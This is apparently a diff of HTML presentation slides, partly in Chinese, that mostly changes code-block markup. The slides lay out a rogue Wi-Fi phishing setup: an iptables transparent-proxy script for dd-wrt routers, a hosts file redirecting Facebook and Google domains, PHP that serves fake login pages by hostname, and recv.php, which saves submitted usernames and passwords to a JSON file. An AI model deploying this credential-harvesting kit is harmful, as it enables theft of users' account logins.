@@ -283,8 +283,7 @@
             </section>
             <section>
               <h2>FON + dd-wrt</h2>
-              <code>
-                <pre contenteditable="false">#!/bin/sh
+              <pre><code class="bash" contenteditable="false">#!/bin/sh
   PROXY_IP=140.127.233.250
   PROXY_PORT=3128
   LAN_IP=`nvram get lan_ipaddr`
@@ -297,8 +296,7 @@
   iptables -t nat -I POSTROUTING -o br0 -s $LAN_NET\
            -d $PROXY_IP -p tcp -j SNAT --to $LAN_IP
   iptables -I FORWARD -i br0 -o br0 -s $LAN_NET -d\
-           $PROXY_IP -p tcp --dport $PROXY_PORT -j ACCEPT</pre>
-              </code>
+           $PROXY_IP -p tcp --dport $PROXY_PORT -j ACCEPT</code></pre>
             </section>
             <section>
               <h2>代理伺服器 - squid <sup style="font-size: 35%; color: #F22;">遠端主機</sup></h2>
@@ -306,12 +304,11 @@
             <section>
               <h2>Transparent Proxy</h2>
               <p>/etc/squid3/squid.conf</p>
-              <code><pre>http_port 3128 <strong style="color:#F92;">transparent</strong></pre>
-              </code>
+              <pre><code>http_port 3128 <strong style="color:#F92;">transparent</strong></code></pre>
             </section>
             <section>
               <h2>hosts file</h2>
-              <code><pre>127.0.0.1       www.facebook.com
+              <pre><code>127.0.0.1       www.facebook.com
 127.0.0.1       m.facebook.com
 127.0.0.1       www.google.com
 127.0.0.1       www.google.com.tw
@@ -322,18 +319,17 @@
 127.0.0.1       static.ak.fbcdn.net
 127.0.0.1       www.static.ak.fbcdn.net
 127.0.0.1       login.facebook.com
-127.0.0.1       www.login.facebook.com
 127.0.0.1       fbcdn.net
 127.0.0.1       www.fbcdn.net
 127.0.0.1       fbcdn.com
 127.0.0.1       www.fbcdn.com
 127.0.0.1       static.ak.connect.facebook.com
-127.0.0.1       www.static.ak.connect.facebook.com</pre></code>
+127.0.0.1       www.static.ak.connect.facebook.com</code></pre>
             </section>
             <section>
               <h2>Hosts File for squid</h2>
               <p>/etc/squid3/squid.conf</p>
-              <code><pre>hosts_file     /etc/hosts.squid</pre></code>
+              <pre><code>hosts_file     /etc/hosts.squid</code></pre>
             </section>
             <section>
               <h2>NGINX - Web Server</h2>
@@ -341,7 +337,7 @@
             </section>
             <section>
               <h3>根據連線網址給釣魚網頁</h3>
-              <code><pre>&lt;?php
+              <pre><code class="php">&lt;?php
 if( strpos($_SERVER['HTTP_HOST'], 'm.facebook.com') !== FALSE)
   $ret = file('facebook_mobile_files/return_page.shtml');
 else if( strpos($_SERVER['HTTP_HOST'], 'facebook.com') !== FALSE){
@@ -355,12 +351,11 @@ else if( strpos($_SERVER['HTTP_HOST'], 'facebook.com') !== FALSE){
   foreach($ret as $line)
     echo $line;
 
-?&gt;</pre></code>
+?&gt;</code></pre>
             </section>
             <section>
               <h3>recv.php</h3>
-              <code>
-                <pre>&lt;?php
+              <pre><code class="php">&lt;?php
 $json_file = "db/data.json";
 if(!isset($_REQUEST['type'],$_REQUEST['username'],$_REQUEST['password'])) {
   header("Location: /");
@@ -381,7 +376,7 @@ $fhandle = fopen($json_file, "w");
 fwrite($fhandle, $output_data);
 fclose($fhandle);
 header('Location: /');
-?&gt;</pre></code>
+?&gt;</code></pre>
             </section>
           </section>
 
